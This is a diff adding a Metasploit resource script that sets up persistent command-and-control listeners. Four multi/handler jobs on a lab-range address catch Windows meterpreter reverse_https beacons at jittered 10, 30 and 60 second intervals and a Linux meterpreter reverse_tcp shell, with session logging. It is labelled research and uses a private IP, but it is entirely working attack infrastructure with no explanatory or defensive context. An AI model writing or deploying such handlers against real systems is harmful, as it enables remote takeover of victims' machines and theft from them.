@@ -1,0 +1,42 @@
+# Research Handlers Resource Script
+# 10% Jitter added for realism
+
+# 1. Logging
+spool /home/kali/Desktop/c2/session_logs.txt
+setg ExitOnSession false
+
+# 2. Handler for 10s Beacon (Port 4444)
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.56.10
+set LPORT 4444
+set HttpWait 10
+set HttpJitter 10
+exploit -j
+
+# 3. Handler for 30s Beacon (Port 4445)
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.56.10
+set LPORT 4445
+set HttpWait 30
+set HttpJitter 10
+exploit -j
+
+# 4. Handler for 60s Beacon (Port 4446)
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.56.10
+set LPORT 4446
+set HttpWait 60
+set HttpJitter 10
+exploit -j
+
+# 5. Handler for Legacy Linux TCP (Port 4447)
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4447
+exploit -j
+
+sessions -l
